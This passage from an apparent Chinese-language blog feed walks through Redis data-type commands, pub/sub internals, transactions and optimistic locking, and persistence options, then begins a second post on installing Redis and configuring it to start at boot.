<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">LPUSH key value [value ...]  #从列表左边放入一个或者多个元素</span><br><span class="line"></span><br><span class="line">LPUSHX key value  #当列表存在时，从左边放入一个元素</span><br><span class="line"></span><br><span class="line">RPUSH key value [value ...]  #从列表右边放入一个或者多个元素</span><br><span class="line"></span><br><span class="line">RPUSHX key value  #当列表存在时，从右边放入一个元素</span><br><span class="line"></span><br><span class="line">LSET key index value  #根据索引设置列表中元素的值,当list不存在是报错</span><br><span class="line"></span><br><span class="line">LINDEX key index  #根据列表索引获取元素值，索引从0开始</span><br><span class="line"></span><br><span class="line">LINSERT key BEFORE|AFTER pivot value  #在列表中，基于某个基准点插入值，pivot代表基准点</span><br><span class="line"></span><br><span class="line">LLEN key #获取列表长度</span><br><span class="line"></span><br><span class="line">LRANGE key start stop  #根据索引获取列表中的元素，列表索引最后一个可以使用-1</span><br><span class="line"></span><br><span class="line">LREM key count value  #从存于 key 的列表里移除前 count 次出现的值为 value 的元素</span><br><span class="line"><span class="meta">#</span><span class="bash">count &gt; 0: 从头往尾移除值为 value 的元素</span></span><br><span class="line"><span class="meta">#</span><span class="bash">count &lt; 0: 从尾往头移除值为 value 的元素</span></span><br><span class="line"><span class="meta">#</span><span class="bash">count = 0: 移除所有值为 value 的元素</span></span><br><span class="line"></span><br><span class="line">LPOP key  #从列表左边删除一个元素</span><br><span class="line"></span><br><span class="line">RPOP key  #从列表右边删除一个元素</span><br><span class="line"></span><br><span class="line">RPOPLPUSH source destination  #删除source列表中的删除最后一个元素将其追加到destination列表</span><br><span class="line"></span><br><span class="line">LTRIM key start stop  #根据索引start和stop保留列表元素</span><br></pre></td></tr></table></figure>

<p><img src="/articles/dfc587ba/3.png" alt></p>
<h4 id="hash操作"><a href="#hash操作" class="headerlink" title="hash操作"></a>hash操作</h4><p>hash操作所有命令都以H开头。</p>
<p>Redis hash 是一个string类型的field和value的映射表，hash特别适合用于存储对象。</p>
<p>Redis 中每个 hash 可以存储 2 32 - 1 键值对（40多亿）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HDEL key field [field ...]  #删除hash表中一个或多个字段</span><br><span class="line"></span><br><span class="line">HEXISTS key field  #判断hash表中字段是否存在</span><br><span class="line"></span><br><span class="line">HGET key field  #获取hash表中字段的值</span><br><span class="line"></span><br><span class="line">HGETALL key  #获取hash表中所有字段</span><br><span class="line"></span><br><span class="line">HSET key field value  # 设置hash表中字段的值</span><br><span class="line"></span><br><span class="line">HSETNX key field value  #只有当字段不存在时候才设置hash表中字段值，</span><br><span class="line"></span><br><span class="line">HLEN key  #获取hash表中字段个数</span><br><span class="line"></span><br><span class="line">HVALS key  #获取hash表中所有字段的值</span><br><span class="line"></span><br><span class="line">HKEYS key  #获取hash表中所有的字段</span><br><span class="line"></span><br><span class="line">HSTRLEN key field #获取hash表中指定字段的值的长度</span><br><span class="line"></span><br><span class="line">HMSET key field value [field value ...]  #批量设置hash表中字段的值</span><br><span class="line"></span><br><span class="line">HMGET key field [field ...]  #批量获取hash表中字段的值</span><br></pre></td></tr></table></figure>

<p><img src="/articles/dfc587ba/4.png" alt></p>
<h4 id="集合set操作"><a href="#集合set操作" class="headerlink" title="集合set操作"></a>集合set操作</h4><p>Redis 的 Set 是 String 类型的无序集合。集合成员是唯一的，这就意味着集合中不能出现重复的数据。</p>
<p>Redis 中集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是 O(1)。</p>
<p>集合中最大的成员数为 2 32 - 1 (4294967295, 每个集合可存储40多亿个成员)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SADD key member [member ...]  #添加一个或多个元素到集合中</span><br><span class="line"></span><br><span class="line">SREM key member [member ...]  #删除一个或多个集合中的元素</span><br><span class="line"></span><br><span class="line">SCARD key  #获取集合中元素数量</span><br><span class="line"></span><br><span class="line">SMEMBERS key  #返回集合中所有的元素</span><br><span class="line"></span><br><span class="line">SINTER key [key ...] #获取两个或两个以上集合的交集</span><br><span class="line"></span><br><span class="line">SUNION key [key ...]  #获取两个或两个以上集合的并集</span><br><span class="line"></span><br><span class="line">SDIFF key [key ...]     #获取两个或者两个以上集合的差集</span><br><span class="line"></span><br><span class="line">SISMEMBER key member  #判断元素是否是在指定集合中</span><br><span class="line"></span><br><span class="line">SMOVE source destination member #移动一个集合中的元素到另一个集合</span><br><span class="line"></span><br><span class="line">SPOP key [count]  #移除count个集合中元素，count可选参数，默认为1，即移除一个</span><br></pre></td></tr></table></figure>

<p><img src="/articles/dfc587ba/5.png" alt></p>
<h4 id="有序集合操作"><a href="#有序集合操作" class="headerlink" title="有序集合操作"></a>有序集合操作</h4><p>Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员。</p>
<p>不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。</p>
<p>有序集合的成员是唯一的,但分数(score)却可以重复。</p>
<p>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)。 集合中最大的成员数为 2 32 - 1 (4294967295, 每个集合可存储40多亿个成员)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZADD key [NX|XX] [CH] [INCR] score member [score member ...]  #向一个有序集合添加成员（元素）</span><br><span class="line"><span class="meta">#</span><span class="bash">参数：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">XX: 仅仅更新存在的成员，不添加新成员。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">NX: 不更新存在的成员。只添加新成员。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">CH: 修改返回值为发生变化的成员总数，原始是返回新添加成员的总数 (CH 是 changed 的意思)。更改的元素是新添加的成员，已经存在的成员更新分数。 所以在命令中指定的成员有相同的分数将不被计算在内。注：在通常情况下，ZADD返回值只计算新添加成员的数量。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">INCR: 当ZADD指定这个选项时，成员的操作就等同ZINCRBY命令，对成员的分数进行递增操作。</span></span><br><span class="line"></span><br><span class="line">ZCARD key  #获取有序集合中元素个数</span><br><span class="line"></span><br><span class="line">ZCOUNT key min max  #指定分数范围的元素个数</span><br><span class="line"></span><br><span class="line">ZINCRBY key increment member  #为有序集的元素的score值加上增加指定的increment</span><br><span class="line"></span><br><span class="line">ZRANGE key start stop [WITHSCORES]  #根据有序集合中分数区间获取集合中的元素</span><br><span class="line"></span><br><span class="line">ZRANGE key start stop [WITHSCORES]  #获取有序集合中元素的排名</span><br><span class="line"></span><br><span class="line">ZREM key member [member ...]  #删除有序集合中一个或多个元素</span><br><span class="line"></span><br><span class="line">ZSCORE key member  #设置元素在集合中的分数</span><br></pre></td></tr></table></figure>

<p><img src="/articles/dfc587ba/6.png" alt></p>
<h4 id="GEO类型操作"><a href="#GEO类型操作" class="headerlink" title="GEO类型操作"></a>GEO类型操作</h4><p>Redis的GEO是 3.2 版本的新特性，对GEO(地理位置)的支持。这个功能可以将用户给定的地理位置信息储存起来， 并对这些信息进行操作。</p>
<p>geo类型命令不多，总共6个所以这里全部列举出来了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GEOADD key longitude latitude member [longitude latitude member ...]  #将指定的地理空间位置（纬度、经度、名称）添加到指定的key中</span><br><span class="line"></span><br><span class="line">GEODIST key member1 member2 [unit]  #返回两个给定位置之间的距离。如果两个位置之间的其中一个不存在， 那么命令返回空值。指定单位的参数 unit 必须是以下单位的其中一个：</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">m 表示单位为米</span></span><br><span class="line"><span class="meta">#</span><span class="bash">km 表示单位为千米</span></span><br><span class="line"><span class="meta">#</span><span class="bash">mi 表示单位为英里</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ft 表示单位为英尺</span></span><br><span class="line"></span><br><span class="line">GEOPOS key member [member ...]  #从key里返回所有给定位置元素的位置（经度和纬度）</span><br><span class="line"></span><br><span class="line">GEOHASH key member [member ...]  #返回一个或多个位置元素的 Geohash 表示。通常使用表示位置的元素使用不同的技术，使用Geohash位置52点整数编码。由于编码和解码过程中所使用的初始最小和最大坐标不同，编码的编码也不同于标准。此命令返回一个标准的Geohash</span><br><span class="line"></span><br><span class="line">GEORADIUS key longitude latitude radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key]  </span><br><span class="line"><span class="meta">#</span><span class="bash">以给定的经纬度为中心， 返回键包含的位置元素当中， 与中心的距离不超过给定最大距离的所有位置元素。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">范围可以使用以下其中一个单位：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">m 表示单位为米。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">km 表示单位为千米。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">mi 表示单位为英里。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ft 表示单位为英尺。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">在给定以下可选项时， 命令会返回额外的信息：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">WITHDIST: 在返回位置元素的同时， 将位置元素与中心之间的距离也一并返回。 距离的单位和用户给定的范围单位保持一致。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">WITHCOORD: 将位置元素的经度和维度也一并返回。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">WITHHASH: 以 52 位有符号整数的形式， 返回位置元素经过原始 geohash 编码的有序集合分值。 这个选项主要用于底层应用或者调试， 实际中的作用并不大。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">命令默认返回未排序的位置元素。 通过以下两个参数， 用户可以指定被返回位置元素的排序方式：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ASC: 根据中心的位置， 按照从近到远的方式返回位置元素。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DESC: 根据中心的位置， 按照从远到近的方式返回位置元素。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">在默认情况下， GEORADIUS 命令会返回所有匹配的位置元素。 虽然用户可以使用 COUNT &lt;count&gt; 选项去获取前 N 个匹配元素， 但是因为命令在内部可能会需要对所有被匹配的元素进行处理， 所以在对一个非常大的区域进行搜索时， 即使只使用 COUNT 选项去获取少量元素， 命令的执行速度也可能会非常慢。 但是从另一方面来说， 使用 COUNT 选项去减少需要返回的元素数量， 对于减少带宽来说仍然是非常有用的。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">返回值：</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">在没有给定任何 WITH 选项的情况下， 命令只会返回一个像 [“New York”,”Milan”,”Paris”] 这样的线性（linear）列表。</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">在指定了 WITHCOORD 、 WITHDIST 、 WITHHASH 等选项的情况下， 命令返回一个二层嵌套数组， 内层的每个子数组就表示一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash">在返回嵌套数组时， 子数组的第一个元素总是位置元素的名字。 至于额外的信息， 则会作为子数组的后续元素， 按照以下顺序被返回：</span></span><br><span class="line">    #以浮点数格式返回的中心与位置元素之间的距离， 单位与用户指定范围时的单位一致。</span><br><span class="line">    #geohash 整数。</span><br><span class="line">    #由两个元素组成的坐标，分别为经度和纬度。</span><br><span class="line"></span><br><span class="line">GEORADIUSBYMEMBER key member radius m|km|ft|mi [WITHCOORD] [WITHDIST] [WITHHASH] [COUNT count] [ASC|DESC] [STORE key] [STOREDIST key]</span><br><span class="line"><span class="meta">#</span><span class="bash">这个命令和 GEORADIUS 命令一样， 都可以找出位于指定范围内的元素， 但是 GEORADIUSBYMEMBER 的中心点是由给定的位置元素决定的。</span></span><br></pre></td></tr></table></figure>

<h2 id="Redis的发布与订阅"><a href="#Redis的发布与订阅" class="headerlink" title="Redis的发布与订阅"></a><strong>Redis的发布与订阅</strong></h2><p>Redis 发布订阅(pub/sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。</p>
<p>Redis 客户端可以订阅任意数量的频道。</p>
<p>下图是三个客户端同时订阅同一个频道</p>
<p><img src="/articles/dfc587ba/8.png" alt="img"></p>
<p>下图是有新信息发送给频道1时，就会将消息发送给订阅它的三个客户端</p>
<p><img src="/articles/dfc587ba/9.png" alt></p>
<h3 id="运作原理"><a href="#运作原理" class="headerlink" title="运作原理"></a>运作原理</h3><p>每个 Redis 服务器进程都维持着一个表示服务器状态的 <code>redis.h/redisServer</code> 结构， 结构的  <code>pubsub_channels</code> 属性是一个字典， 这个字典就用于保存订阅频道的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct redisServer &#123;</span><br><span class="line">    // ...</span><br><span class="line">    dict *pubsub_channels;</span><br><span class="line">    // ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中，字典的键为正在被订阅的频道， 而字典的值则是一个链表， 链表中保存了所有订阅这个频道的客户端。</p>
<p>比如说，在下图展示的这个 <code>pubsub_channels</code> 示例中，  <code>client1</code> 、  <code>client2</code> 和  <code>client3</code> 就订阅了  <code>channel1</code> ， 而client3也同时订阅了channel2。</p>
<p>当客户端调用 SUBSCRIBE 命令时， 程序就将客户端和要订阅的频道在 <code>pubsub_channels</code>字典中关联起来。</p>
<p><img src="/articles/dfc587ba/10.png" alt="img"></p>
<p>SUBSCRIBE 命令的行为可以用伪代码表示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def SUBSCRIBE(client, channels):</span><br><span class="line"></span><br><span class="line">    // 遍历所有输入频道</span><br><span class="line">    for channel in channels:</span><br><span class="line"></span><br><span class="line">        // 将客户端添加到链表的末尾</span><br><span class="line">        redisServer.pubsub_channels[channel].append(client)</span><br></pre></td></tr></table></figure>

<p>通过 <code>pubsub_channels</code> 字典， 程序只要检查某个频道是否为字典的键， 就可以知道该频道是否正在被客户端订阅； 只要取出某个键的值， 就可以得到所有订阅该频道的客户端的信息。</p>
<p>了解了 <code>pubsub_channels</code> 字典的结构之后， 解释 PUBLISH 命令的实现就非常简单了： 当调用  <code>PUBLISH channel message</code> 命令， 程序首先根据  <code>channel</code> 定位到字典的键， 然后将信息发送给字典值链表中的所有客户端。</p>
<h3 id="订阅模式"><a href="#订阅模式" class="headerlink" title="订阅模式"></a>订阅模式</h3><p>redis的发布订阅不仅仅提供简单的订阅频道，还提供模式匹配订阅。模式订阅使用命令PSUBSCRIBE实现。</p>
<p><code>redisServer.pubsub_patterns</code> 属性是一个链表，链表中保存着所有和模式相关的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct redisServer &#123;</span><br><span class="line">    // ...</span><br><span class="line">    list *pubsub_patterns;</span><br><span class="line">    // ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>链表中的每个节点都包含一个 <code>redis.h/pubsubPattern</code> 结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct pubsubPattern &#123;</span><br><span class="line">    redisClient *client;</span><br><span class="line">    robj *pattern;</span><br><span class="line">&#125; pubsubPattern;</span><br></pre></td></tr></table></figure>

<p><code>client</code> 属性保存着订阅模式的客户端，而  <code>pattern</code> 属性则保存着被订阅的模式。</p>
<p>每当调用 <code>PSUBSCRIBE</code> 命令订阅一个模式时， 程序就创建一个包含客户端信息和被订阅模式的  <code>pubsubPattern</code> 结构， 并将该结构添加到  <code>redisServer.pubsub_patterns</code> 链表中。</p>
<p>作为例子，下图展示了一个包含两个模式的 <code>pubsub_patterns</code> 链表， 其中  <code>client123</code> 和  <code>client256</code> 都正在订阅  <code>tweet.shop.*</code> 模式：</p>
<p><img src="/articles/dfc587ba/11.png" alt="img"></p>
<p>通过遍历整个 <code>pubsub_patterns</code> 链表，程序可以检查所有正在被订阅的模式，以及订阅这些模式的客户端。</p>
<p>当执行PUBLISH进行命令向channel命令发送消息时，PUBLISH 除了将 <code>message</code> 发送到所有订阅  <code>channel</code> 的客户端之外， 它还会将  <code>channel</code> 和  <code>pubsub_patterns</code> 中的模式进行对比， 如果  <code>channel</code> 和某个模式匹配的话， 那么也将  <code>message</code> 发送到订阅那个模式的客户端，例如一个客户端订阅了aa.bb.*频道，那么他会收到来自所有aa.bb开头的所有频道消息。</p>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PSUBSCRIBE pattern [pattern ...]  #使用模式订阅一个或多个符合给定模式的频道</span><br><span class="line"></span><br><span class="line">PUNSUBSCRIBE [pattern [pattern ...]]  #退订所有给定模式的频道</span><br><span class="line"></span><br><span class="line">SUBSCRIBE channel [channel ...]   #订阅给定的一个或多个频道的信息</span><br><span class="line"></span><br><span class="line">UNSUBSCRIBE [channel [channel ...]]   #指退订给定的频道</span><br><span class="line"></span><br><span class="line">PUBSUB subcommand [argument [argument ...]]  #查看订阅与发布系统状态</span><br><span class="line"></span><br><span class="line">PUBLISH channel message   #将信息发送到指定的频道</span><br></pre></td></tr></table></figure>

<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>在以下示例中，将分别用SUBSCRIBE命令订阅aa.bb和使用PSUBSCRIBE模式订阅频道aa.bb*。</p>
<p>SUBSCRIBE订阅：</p>
<p><img src="/articles/dfc587ba/12.png" alt="img"></p>
<p>PSUBSCRIBE订阅：</p>
<p><img src="/articles/dfc587ba/13.png" alt="img"></p>
<p>此时我们使用PUBSH向aa.bb发送消息，返回接受到的频道数，两个订阅者都能收到消息。</p>
<p><img src="/articles/dfc587ba/14.png" alt="img"></p>
<p>订阅者1:</p>
<p><img src="/articles/dfc587ba/15.png" alt="img"></p>
<p>模式订阅者：</p>
<p><img src="/articles/dfc587ba/16.png" alt="img"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>订阅信息由服务器进程维持的  <code>redisServer.pubsub_channels</code>  字典保存，字典的键为被订阅的频道，字典的值为订阅频道的所有客户端。</li>
<li>当有新消息发送到频道时，程序遍历频道（键）所对应的（值）所有客户端，然后将消息发送到所有订阅频道的客户端上。</li>
<li>订阅模式的信息由服务器进程维持的  <code>redisServer.pubsub_patterns</code>  链表保存，链表的每个节点都保存着一个  <code>pubsubPattern</code>  结构，结构中保存着被订阅的模式，以及订阅该模式的客户端。程序通过遍历链表来查找某个频道是否和某个模式匹配。</li>
<li>当有新消息发送到频道时，除了订阅频道的客户端会收到消息之外，所有订阅了匹配频道的模式的客户端，也同样会收到消息。</li>
<li>退订频道和退订模式分别是订阅频道和订阅模式的反操作。</li>
</ul>
<h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>所谓事务应具有以下特效：原子性(Atomicity)， 一致性(Consistency)，隔离性(Isolation)，持久性(Durability)，简称ACID，但redis所提供的事务比较简单，它通过MULTI、EXEC、DISCARD和WATCH等命令实现事务。</p>
<p>而Redis只支持简单的事务，将执行命令放入队列缓存，当程序中有异常或命令出错，执行DISCARD清空缓存队列不执行队列中命令，其事务过程有以下特点：</p>
<ul>
<li>事务是一个单独的隔离操作：事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断。</li>
<li>事务是一个 <strong>泛原子</strong> 操作（这里我以泛原子称呼，在某些情况redis的事务不是原子性的，后续会说明）：事务中的命令要么全部被执行，要么全部都不执行。</li>
</ul>
<p>EXEC 命令负责触发并执行事务中的所有命令：</p>
<ul>
<li>如果客户端在使用 MULTI 开启了一个事务之后，却因为断线而没有成功执行 EXEC ，那么事务中的所有命令都不会被执行。</li>
<li>另一方面，如果客户端成功在开启事务之后执行 EXEC ，那么事务中的所有命令都会被执行。</li>
</ul>
<p>特别说明文中的 <strong>泛原子操作</strong> ：</p>
<ul>
<li>redis在开启事务以后，若执行命令具有显示的错误或者客户端中断则此次事务在执行EXEC命令时会调用DISCARD清空缓存队列不执行队列中的所有任务，此时是原子性的。</li>
<li>当执行命令过程中，命令没有显示的报错（例如LSET操作设置一个不存在的list），而是在EXEC调用时候某个命令出错，那么在这之前已经执行的命令将不会回滚，所以严格说来， redis并不支持原子性。</li>
</ul>
<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">MULTI  #用于标记事务块的开始。Redis会将后续的命令逐个放入队列中，然后才能使用EXEC命令执行缓存队列中的命令。</span><br><span class="line"></span><br><span class="line">EXEC  #执行缓存队列中的命令</span><br><span class="line"></span><br><span class="line">DISCARD  #清除所有先前在一个事务中放入队列的命令，然后恢复正常的连接状态，如果使用了WATCH命令，那么DISCARD命令就会将当前连接监控的所有键取消监控。</span><br><span class="line"></span><br><span class="line">WATCH key [key ...]   #当某个事务需要按条件执行时，就要使用这个命令将给定的键设置为受监控的</span><br><span class="line"></span><br><span class="line">UNWATCH  #清除所有先前为一个事务监控的键，如果你调用了EXEC或DISCARD命令，那么就不需要手动调用UNWATCH命令</span><br></pre></td></tr></table></figure>

<h3 id="乐观锁机制"><a href="#乐观锁机制" class="headerlink" title="乐观锁机制"></a>乐观锁机制</h3><p>乐观锁：总是认为不会产生并发问题，每次去取数据的时候总认为不会有其他线程对数据进行修改，因此不会上锁，但是在更新时会判断其他线程在这之前有没有对数据进行修改，一般会使用版本号机制或检查再设置(CAS)操作实现。</p>
<p>redis通过WATCH命令实现乐观锁，作为WATCH命令的参数的键会受到Redis的监控，Redis能够检测到它们的变化。在执行EXEC命令之前，如果Redis检测到至少有一个键被修改了，那么整个事务便会中止运行，然后EXEC命令会返回一个nil值，提醒用户事务运行失败。</p>
<p>注意：WATCH命令需要在MULTI之前执行，不然redis会将其一个命令放入缓存队列中。</p>
<p>示例：在以下示例中通过一个客户端开启事务监听name键，另一个客户端在执行EXEC之前修改name键，此次事务将不会执行，并返回nil，如下。</p>
<p><img src="/articles/dfc587ba/17.png" alt="img"></p>
<p><img src="/articles/dfc587ba/18.png" alt="img"></p>
<h3 id="原子性实践"><a href="#原子性实践" class="headerlink" title="原子性实践"></a>原子性实践</h3><p>为演示redis严格意义上将不支持原子性，做了一些简单实践。</p>
<p><img src="/articles/dfc587ba/19.png" alt="img"></p>
<p>从上面的结果可以看出，在开启事务前name 值为Rose，在开启事务先后执行了SET命令和LSET命令，但是LSET命令是错误的，当我们调用EXEC执行事务完事务以后，在回头看事务中的SET命令已经生效，并未回滚，因为在次过程中该命令没有显示的报错，所以可以说redis的事务不支持原子性。</p>
<h2 id="Redis的持久化"><a href="#Redis的持久化" class="headerlink" title="Redis的持久化"></a><strong>Redis的持久化</strong></h2><p>redis持久有两种方式：快照（快照），仅附加文件（AOF).</p>
<h4 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h4><p>1，将存储在内存的数据以快照的方式写入二进制文件中，如默认dump.rdb中<br>2，保存900 1 </p>
<p>＃900秒内如果超过1个Key被修改，则启动快照保存<br>3，保存300 10 </p>
<p>＃300秒内如果超过10个Key被修改，则启动快照保存<br>4，保存60 10000 </p>
<p>＃60秒内如果超过10000个重点被修改，则启动快照保存</p>
<h4 id="仅附加文件（AOF）"><a href="#仅附加文件（AOF）" class="headerlink" title="仅附加文件（AOF）"></a>仅附加文件（AOF）</h4><p>1，使用AOF持久时，服务会将每个收到的写命令通过写函数追加到文件中（appendonly.aof）<br>2，AOF持久化存储方式参数说明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">appendonly yes  ＃开启AOF持久化存储方式 </span><br><span class="line">appendfsync always ＃收到写命令后就立即写入磁盘，效率最差，效果最好</span><br><span class="line">appendfsync everysec  ＃每秒写入磁盘一次，效率与效果居中</span><br><span class="line">appendfsync no  ＃完全依赖操作系统，效率最佳，效果没法保证</span><br></pre></td></tr></table></figure>

<h2 id="Redis的性能测试"><a href="#Redis的性能测试" class="headerlink" title="Redis的性能测试"></a><strong>Redis的性能测试</strong></h2><p>自带相关测试工具</p>
<p><img src="/articles/dfc587ba/20.png" alt></p>
<p><img src="/articles/dfc587ba/21.png" alt></p>
<p>实际测试同时执行100万的请求</p>
<p><img src="/articles/dfc587ba/22.png" alt></p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>NoSQL</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis系列之安装</title>
    <url>/articles/72cca2b5.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redis作为nosql家族中非常热门的一员，也是被大型互联网公司所青睐，无论你是开发、测试或者运维，学习掌握它总会为你的职业生涯增色添彩。本文介绍Redis的安装及配置详解。</p>
<a id="more"></a>

<h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>redis(REmote DIctionary Server)是一个由Salvatore Sanfilippo写key-value存储系统，它由C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value类型的数据库，并提供多种语言的API。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步，redis在3.0版本推出集群模式。</p>
<h3 id="特点、优势"><a href="#特点、优势" class="headerlink" title="特点、优势"></a>特点、优势</h3><ul>
<li>k、v键值存储以及数据结构存储（如列表、字典）</li>
<li>所有数据(包括数据的存储)操作均在内存中完成</li>
<li>单线程服务(这意味着会有较多的阻塞情况)，采用epoll模型进行请求响应，对比nginx</li>
<li>支持主从复制模式，更提供高可用主从复制模式（哨兵）</li>
<li>去中心化分布式集群</li>
<li>丰富的编程接口支持，如Python、Golang、Java、php、Ruby、Lua、Node.js </li>
<li>功能丰富，除了支持多种数据结构之外，还支持事务、发布/订阅、消息队列等功能</li>
<li>支持数据持久化(AOF、RDB)</li>
</ul>
<h3 id="对比memcache"><a href="#对比memcache" class="headerlink" title="对比memcache"></a>对比memcache</h3><ul>
<li>memcache是一个分布式的内存对象缓存系统，并不提供持久存储功能，而redis拥有持久化功能</li>
<li>memcache数据存储基于LRU(简单说：最近、最少使用key会被剔除)，而redis则可以永久保存(服务一直运行情况下)</li>
<li>memcache是多线程的（这是memcache优势之一），也就意味着阻塞情况少，而redis是单线程的，阻塞情况相对较多</li>
<li>两者性能上相差不大</li>
<li>memcache只支持简单的k、v数据存储，而redis支持多种数据格式存储。</li>
<li>memcache是多线程、非阻塞IO复用网络模型，而redis是单线程IO复用模型</li>
</ul>
<h2 id="安装部署"><a href="#安装部署" class="headerlink" title="安装部署"></a>安装部署</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gcc -y  #安装C依赖</span><br><span class="line">wget http://download.redis.io/redis-stable.tar.gz  #下载稳定版本</span><br><span class="line">tar zxvf redis-stable.tar.gz  #解压</span><br><span class="line">cd redis-stable</span><br><span class="line">make PREFIX=/opt/redis test   #指定目录编译，也可以不用指定</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###启动与停止</span></span></span><br><span class="line">/etc/init.d/redis start</span><br><span class="line">/etc/init.d/redis stop</span><br></pre></td></tr></table></figure>

<h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>1，设置redis.conf中daemonize为yes,确保守护进程开启,也就是在后台可以运行.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/redis/6379.conf #修改配置文件： </span><br><span class="line">bind 0.0.0.0      #监听地址</span><br><span class="line">maxmemory 4294967296   #限制最大内存（4G）：</span><br><span class="line">daemonize yes   #后台运行</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>复制redis配置文件(启动脚本需要用到配置文件内容,所以要复制)</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@localhost /]# mkdir /etc/redis    #在/etc下新建redis文件夹``[root@localhost redis]# cp /opt/redis-3.0.5/redis.conf /etc/redis/6379.conf   #把安装redis目录里面的redis.conf文件复制到/etc/redis/6379.conf里面,6379.conf启动脚本里面的变量会读取这个名称,6379是redis的端口号       `</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>复制redis启动脚本</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@localhost redis]# find / -name redis_init_script    #redis启动脚本一般在redis根目录的utils,如果不知道路径,可以先查看路径``/usr/redis/redis-3.2.4/utils/redis_init_script``[root@localhost redis]# cp /opt/redis-3.0.5/utils/redis_init_script /etc/init.d/redis    #复制启动脚本到/etc/rc.d/init.d/redis文件中`</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>修改启动脚本参数</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@localhost redis]# vim /etc/rc.d/init.d/redis``#在/etc/init.d/redis文件的头部添加下面两行注释代码,也就是在文件中#!/bin/sh的下方添加``# chkconfig: 2345 10 90 ``# description: Start and Stop redis`</span><br></pre></td></tr></table></figure>

<p>同时还要修改参数,指定redis的安装路径</p>
